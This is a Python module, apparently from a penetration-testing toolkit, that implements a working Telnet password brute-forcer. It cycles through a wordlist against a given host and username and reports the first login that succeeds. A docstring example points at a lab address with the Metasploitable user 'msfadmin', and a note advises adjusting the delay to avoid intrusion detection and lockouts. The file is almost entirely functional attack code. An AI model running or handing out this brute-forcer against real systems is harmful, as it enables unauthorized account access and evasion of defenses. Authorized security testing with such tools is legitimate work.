import time
import telnetlib
from typing import Optional
from .utils import clear_line
from settings import (
    TELNET_FAILURE_INDICATORS,
    TELNET_SUCCESS_INDICATORS,
    TELNET_SLEEP_DELAY
)


def telnet_bruteforce(
    host: str,
    username: str,
    wordlist_path: str,
    port: int = 23,
    timeout: int = 5,
    delay: float = 1.0,
) -> Optional[str]:
    """
    Attempt password guesses against a Telnet service using a wordlist.

    This function iterates over passwords from a file and attempts to authenticate
    to a Telnet server using the supplied username. It returns the first password
    that appears to successfully authenticate, or ``None`` if no password from
    the wordlist succeeds.

    Args:
        host (str): Target hostname or IP address of the Telnet server.
        username (str): Username to use for authentication attempts.
        wordlist_path (str): Path to a file containing candidate passwords,
            one password per line. The file is opened with UTF-8 and errors are
            ignored.
        port (int, optional): Telnet port to connect to. Defaults to 23.
        timeout (int | float, optional): Connection/read timeout in seconds
            passed to ``telnetlib`` operations. Defaults to 5.
        delay (float, optional): Delay in seconds between attempts to avoid
            overwhelming the target and to reduce likelihood of lockouts.
            Defaults to 1.0.

    Returns:
        Optional[str]: The password string if authentication appears successful,
        otherwise ``None`` if no password worked.

    Raises:
        FileNotFoundError: If ``wordlist_path`` does not exist or cannot be opened.
        OSError: For low-level socket/Telnet errors raised by ``telnetlib`` when
            opening the connection.
        Exception: Other unexpected exceptions may propagate from underlying
            telnet operations.

    Behavior and heuristics:
        * The function attempts to detect server prompts like "login:" / "username:"
          and "Password:" and writes the username and password accordingly.
        * After submitting credentials it reads available text from the server
          buffer and checks for indicators defined in the settings:
          ``TELNET_SUCCESS_INDICATORS`` and ``TELNET_FAILURE_INDICATORS``.
          These lists are used as simple heuristics to determine success or failure.
        * On a detected success the function prints a success message, closes the
          connection, and returns the password. On failure it prints a failure or
          diagnostic message and continues with the next password.
        * The function respects ``delay`` between attempts and closes Telnet
          connections in a finally block to avoid resource leaks.
        * Because server behavior varies, detection is heuristic and may yield
          false positives/negatives. Use additional verification on your test host
          if strict confirmation is required.

    Example:
        >>> found = telnet_bruteforce("192.168.56.101", "msfadmin", "/tmp/wordlist.txt")
        >>> if found:
        ...     print("Found password:", found)
        ... else:
        ...     print("No password found in wordlist.")

    Security note:
        * Run only against systems you control or have permission to test.
        * Increase ``delay`` and/or add rate-limiting if testing against networked
          targets to avoid triggering intrusion-detection or lockout mechanisms.
    """
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as file:
        for line in file:
            password = line.strip()
            tn = telnetlib.Telnet()
            clear_line()
            print(f"[?] Trying Telnet {username}:{password}", end="\r")

            try:
                tn.open(host, port, timeout=timeout)
            except Exception as e:
                clear_line()
                print(f"[-] Could not connect to {host}:{port} — {e}", end="\r")
                tn.close()
                time.sleep(delay)
                continue

            try:
                try:
                    prompt = tn.read_until(b"login: ", timeout=2)
                except Exception:
                    prompt = b""

                if b"login" in prompt.lower() or b"username" in prompt.lower():
                    tn.write(username.encode("utf-8") + b"\n")
                    tn.read_until(b"Password: ", timeout=2)
                    tn.write(password.encode("utf-8") + b"\n")
                else:
                    tn.write(username.encode("utf-8") + b"\n")
                    time.sleep(TELNET_SLEEP_DELAY)
                    tn.write(password.encode("utf-8") + b"\n")

                time.sleep(TELNET_SLEEP_DELAY)
                try:
                    response = tn.read_very_eager()
                except Exception:
                    response = b""

                text = response.decode(errors="ignore").lower()

                if any(ind in text for ind in TELNET_SUCCESS_INDICATORS):
                    clear_line()
                    print(f"[+] Telnet login succeeded: {username}:{password}")
                    tn.close()
                    return password

                if any(ind in text for ind in TELNET_FAILURE_INDICATORS):
                    clear_line()
                    print(
                        f"[-] Telnet login failed for {username}:{password}", end="\r"
                    )
                else:
                    clear_line()
                    snippet = text.replace("\n", " ")[:200]
                    print(
                        f"[-] Unknown response for {username}:{password} -> {snippet!r}",
                        end="\r",
                    )

            except Exception as e:
                clear_line()
                print(f"[!] Telnet error for {username}:{password}: {e}", end="\r")
            finally:
                try:
                    tn.close()
                except Exception:
                    pass

            time.sleep(delay)

    return None
